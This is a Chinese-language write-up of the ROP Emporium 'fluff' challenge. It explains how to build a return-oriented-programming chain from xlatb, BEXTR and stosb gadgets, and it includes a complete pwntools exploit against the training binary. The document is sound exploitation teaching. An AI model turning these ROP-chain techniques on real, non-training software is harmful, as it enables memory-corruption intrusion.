# fluff

> ROP Emporium 第 6 题 | x86-64 Linux | 知识点: xlatb + BEXTR + stosb + 链式状态优化 + 栈对齐

## 题目简介

目标仍然是调用 `print_file("flag.txt")`,但出题人把**所有便利 gadget 都砍了**:

- 没有 `pop rax` / `pop rbx`
- 没有 `mov qword ptr [reg], reg2` (write4 的核心)
- 程序里甚至没有现成的 `"flag.txt"` 字符串

取而代之的是三条藏在 `questionableGadgets` 里的诡异指令:

| 被砍的常规操作 | 替代 gadget | 地址 |
|---|---|---|
| `mov qword [reg], reg2` | `stosb byte ptr [rdi], al ; ret` | `0x400639` |
| `pop rax` | `xlatb ; ret` (`AL = byte[RBX + AL]`) | `0x400628` |
| `pop rbx` | `pop rdx ; pop rcx ; add rcx, 0x3ef2 ; BEXTR rbx, rcx, rdx ; ret` | `0x40062a` |

本质:用三条冷门 x86 指令完成 write4 已经会做的事——在内存里构造 `"flag.txt"` 并调用 `print_file`。

## 核心知识点

- **`xlatb`** (Table Look-up Translation): `AL = byte ptr [RBX + AL]`, 8086 时代遗留的查表指令
- **`BEXTR`** (Bit Field Extract, BMI1 指令集): 用控制字 `0x4000` (start=0, length=64) 实现 `RBX = RCX`
- **`stosb`** (Store String Byte): `[RDI] = AL; RDI += 1`, 强制锁定 AL→[RDI], 自动前进指针
- **`.bss` 段利用**: 可写、初始全 0, 放临时字符串 + 清零 AL 的跳板
- **链式状态优化**: 不每轮清零 AL, 而是把上一轮结果补偿进下一轮 RBX, 大幅缩短 ROP 链
- **栈对齐 N 计数法**: 复杂链里每个 gadget 的 `pop` 和末尾 `ret` 都要计入, 不能只数 `pop` 个数

## 走过的弯路(最有价值的部分)

### 弯路 1: 误以为 `'x'` 字节在主程序里没有

之前搜索 `'x'`(0x78)时没找到, 笔记里记了 `"x 字节在主程序中没有"。

实际用 `elf.search(b'x')` 找到 `0x400246`——某条指令的操作数里恰好包含 `0x78`。xlatb 读的是内存字节, 不在乎是数据段还是代码段。

**教训: 不要预设答案, 先用工具验证。** 之前认为 `"x"` 没有, 是第一轮搜索方法有误(可能在字符串表搜索, 漏了代码区)。

### 弯路 2: 误判 usefulFunction 是"半成品通关"

`usefulFunction` 调用了 `print_file("nonexistent")`, 第一眼以为可以把 `"nonexistent"` 改成 `"flag.txt"`。

实际 `"nonexistent"` 落在 `.rodata` 段(`0x4006c4`), **只读不可写**。

```
.rodata   0x4006c0   ← 只读
.data     0x601028   ← 可写
.bss      0x601038   ← 可写, 初始全 0
```

**教训: 看到现成字符串先 `readelf -S` 或 Ghidra 确认段属性, 不要假设可写。** `usefulFunction` 是出题人的迷惑项, 不是捷径。

### 弯路 3: 漏了"链开头清零 AL"

第一版 exploit 假设链开始时 AL = 0, 直接用 xlatb 读第一个字符 `'f'`。

但 pwnme 末尾调了 `puts("Thank you!")`, puts 返回写入字符数(非 0)。所以链开始时 AL = puts 返回值 ≠ 0, 第一轮 xlatb 读到的不是 `'f'`。

**修复: 链开头插入一次"无害预处理 xlatb"**, RBX 指向 `.bss + 0x200`(全 0 区)。无论 AL 初始是多少(0~255), `byte[(.bss + 0x200) + AL]` 都是 0(.ss 整段为 0)。xlatb 后 AL = 0, 后续轮次正确。

**教训: ROP 链继承的是前一个函数(puts)的寄存器状态, 不是清零状态。复杂 gadget 链必须考虑入口脏寄存器。**

## 二进制侦察

```bash
file ./fluff
# fluff: ELF 64-bit LSB executable, x86-64

checksec --file=fluff
# NX enabled, Stack: No canary, No PIE

ROPgadget --binary fluff | grep "stosb\|xlatb\|bextr"
# 这三条指令正常不会出现在 ROP 题里, 是 fluff 的标志

python3 -c "from pwn import *; e=ELF('./fluff'); print([hex(next(e.search(bytes([c])))) for c in b'flag.txt'])"
# 搜索每个字符在二进制中的出现地址
```

## 三条诡异 gadget 详解

### stosb: 逐字节写内存

```asm
stosb byte ptr [rdi], al ; ret    @ 0x400639
```

- `[RDI] = AL` (写 1 字节)
- `RDI += 1` (自动前进)
- **强制锁定**: 数据源必须是 AL, 目标必须是 [RDI]

8 字节 `"flag.txt"` 必须循环 8 次 stosb, 因为一次只写 1 字节。

### xlatb: 查表读字节到 AL

```asm
xlatb ; ret    @ 0x400628
```

- `AL = byte ptr [RBX + AL]`
- 要让 AL = `'f'`(0x66): 找内存中某个地址 X 处字节就是 0x66, 然后 RBX = X, AL = 0, 执行 xlatb

字符地址表(用 `elf.search()` 找):

| 字符 | 地址 | 来源 |
|---|---|---|
| `f` | `0x4003c4` | 某字符串/数据 |
| `l` | `0x400239` | 某字符串/数据 |
| `a` | `0x4003d6` | 某字符串/数据 |
| `g` | `0x4003cf` | 某字符串/数据 |
| `.` | `0x40024e` | 某字符串/数据 |
| `t` | `0x400192` | 某字符串/数据 |
| `x` | `0x400246` | **某指令操作数** |

### BEXTR: 用位抽取当 `pop rbx`

```asm
pop rdx ; pop rcx ; add rcx, 0x3ef2 ; bextr rbx, rcx, rdx ; ret    @ 0x40062a
```

BEXTR (Bit Field Extract) 语义:
- RBX = 从 RCX 的 `start` 位开始抽取 `length` 位
- RDX 低 8 位 = start, 接下来 8 位 = length

控制字 `0x4000` → start=0, length=64:
- 抽取 RCX 整 64 位 = "RBX = RCX"

完整执行链(栈上压入的值):
1. `pop RDX` → RDX = `0x4000` (控制字)
2. `pop RCX` → RCX = `目标地址 - 0x3ef2` (倒着算, 因为后面要加)
3. `add rcx, 0x3ef2` → RCX = 目标地址
4. `BEXTR rbx, rcx, rdx` → RBX = RCX = 目标地址
5. `ret`

每次占栈 **3 qword**: gadget 地址 + RDX 值 + RCX 值。

## 攻击策略

### 阶段 1: 清零 AL

链式 AL 假设第一轮 prev_AL = 0, 但实际 AL ≠ 0。

```
BEXTR gadget  +  0x4000  +  (.bss + 0x200 - 0x3ef2)  +  XLATB
```

RBX 指向 `.bss + 0x200`(全 0 区), xlatb 后 AL = 0。

### 阶段 2: 设 RDI = .bss

```
POP_RDI  +  .bss 地址
```

stosb 会自动 RDI++, 所以只需设一次。

### 阶段 3: 8 轮 stosb 写 "flag.txt"

朴素方案(每轮清零 AL): 8 qword/字节 → 链超载。

**优化: 链式 AL**

```
设 prev_AL = a(上一轮目标字符)
设 本轮目标字符地址 = X
设 RBX = X - a
xlatb → AL = byte[(X - a) + a] = byte[X] = 目标字符 ✓
```

代码:
```python
prev = 0
for c in b'flag.txt':
    rcx = (addr[c] - prev - 0x3ef2) & 0xFFFFFFFFFFFFFFFF
    chain += p64(BEXTR) + p64(0x4000) + p64(rcx) + p64(XLATB) + p64(STOSB)
    prev = c
```

每轮 **5 qword**, 8 轮 40 qword = 320 字节。

### 阶段 4: 调用 print_file

```
POP_RDI  +  .bss  +  RET(对齐)  +  print_file@plt
```

末尾 RET 用于栈对齐(详见下文)。

## 栈对齐核算

进入 `print_file` 时 RSP mod 16 必须 = 8(内部 `movaps` 要求)。

数 N = 所有 `pop` + `ret` 总数(每个 gadget 末尾的 ret 都算):

| 阶段 | pop+ret 数 |
|---|---|
| 清零 AL | BEXTR(3) + XLATB(1) = **4** |
| 初始 pop rdi | **2** |
| 8 轮 × 5 | **40** |
| 末尾 pop rdi | **2** |
| 末尾纯 ret(对齐补偿) | **1** |
| **合计 N** | **49** |

49 是奇数 → RSP mod 16 = 8 → 对齐 ✓

不加纯 ret 时 N = 48(偶) → 不对齐 → `movaps` 段错误。

## Exploit

完整代码见 [exploit.py](./exploit.py)。

```python
from pwn import *

elf = context.binary = ELF('./fluff')
io = process('./fluff')

BEXTR, XLATB, STOSB = 0x40062a, 0x400628, 0x400639
rop = ROP(elf)
POP_RDI = rop.find_gadget(['pop rdi', 'ret']).address
RET     = rop.find_gadget(['ret']).address
BSS     = elf.bss()

addr = {ord('f'):0x4003c4, ord('l'):0x400239, ord('a'):0x4003d6,
        ord('g'):0x4003cf, ord('.'):0x40024e, ord('t'):0x400192,
        ord('x'):0x400246}

# (1) 清零 AL: RBX 指向 .bss + 0x200(全 0 区)
clear_rbx = BSS + 0x200
chain  = p64(BEXTR) + p64(0x4000) + p64((clear_rbx - 0x3ef2) & 0xFFFFFFFFFFFFFFFF) + p64(XLATB)

# (2) RDI = .bss(stosb 自动 ++)
chain += p64(POP_RDI) + p64(BSS)

# (3) 8 轮 stosb 写 "flag.txt"
prev = 0
for c in b'flag.txt':
    rcx = (addr[c] - prev - 0x3ef2) & 0xFFFFFFFFFFFFFFFF
    chain += p64(BEXTR) + p64(0x4000) + p64(rcx) + p64(XLATB) + p64(STOSB)
    prev = c

# (4) 调 print_file(.bss), 末尾 RET 用于栈对齐
chain += p64(POP_RDI) + p64(BSS) + p64(RET) + p64(elf.plt['print_file'])

payload = b'A'*40 + chain
log.info(f'payload {len(payload)} / limit 512')
io.sendline(payload)
io.interactive()
```

**链长度核算:**

- padding: 40 字节
- 清零 AL: 4 qword = 32 字节
- 初始 pop rdi: 2 qword = 16 字节
- 8 轮 stosb: 40 qword = 320 字节
- 末尾收尾: 4 qword = 32 字节
- **合计 440 字节**(read 限制 512 字节, 余量 72 字节) ✓

## 关键细节

### xlatb 的 RBX+AL 是 64 位加法

`xlatb` 在 x86-64 模式下使用 `RBX + AL` 的 64 位地址计算。AL 是 8 位(0~255), 但和 RBX 相加时是零扩展的。所以 `.bss + 0x200 + AL` 的取值范围是 `.bss + 0x200` 到 `.bss + 0x2ff`, 全部在 .bss 内(全 0)。

### BEXTR 的 RCX 计算是 64 位有符号加法后截断

`add rcx, 0x3ef2` 在 64 位下执行。如果目标地址小于 `0x3ef2`, 需要 wrap-around 处理。Python 里用 `& 0xFFFFFFFFFFFFFFFF` 保持 64 位无符号。

### 为什么 `'x'` 在 `0x400246`

这个地址落在代码段(`.text` 起始约 `0x4004e0` 之前是 ELF header + program header)。具体是哪条指令的操作数不重要, 重要的是 `elf.search(b'x')` 能找到它。xlatb 不关心内存段属性, 只读 1 字节。

### 链式状态优化的通用性

这道题教了一个重要思想: **不强行清零中间状态, 而是把脏状态融入下一步计算。**

从朴素方案(每轮清零)到优化方案(链式 AL), 节省了 24 qword = 192 字节。这在 ROP 链长度受限(read 512 字节)时决定成败。

## 学到的东西

- **冷门指令不是魔法**: xlatb/BEXTR/stosb 看起来陌生, 但查手册后语义很确定。ROP 的本质是"程序里有什么就用什么", 不需要预先知道所有指令
- **寄存器状态有继承性**: ROP 链不是从零开始的, 前一个函数(puts)留下的寄存器值会影响你的 gadget。复杂链必须验证入口状态
- **栈对齐在复杂链里更容易出错**: 简单链"数 pop 个数"的规律在夹杂 mov/xor/stosb 等非 pop gadget 时失效, 必须用"数所有 pop + ret"的方法
- **先搜索再假设**: `'x'` 字节有没有、字符地址在哪, 都应该先跑 `elf.search()` 确认, 不要凭记忆下结论
- **链式优化思想可迁移**: 任何"每轮清零再设置"的模式, 都可以考虑"接受脏状态 + 下一步补偿"的优化

## Flag

```
ROPE{a_placeholder_32byte_flag!}
```
(占位 flag, 在 CTF 实战环境会是真实 flag)

## 参考

- ROP Emporium: <https://ropemporium.com/challenge/fluff.html>
- x86 `xlatb` 指令: Intel SDM Vol. 2B, "XLAT/XLATB"
- BMI1 `BEXTR` 指令: Intel SDM Vol. 2A, "BEXTR"
- x86 `stosb` 指令: Intel SDM Vol. 2B, "STOS/STOSB/STOSW/STOSD/STOSQ"
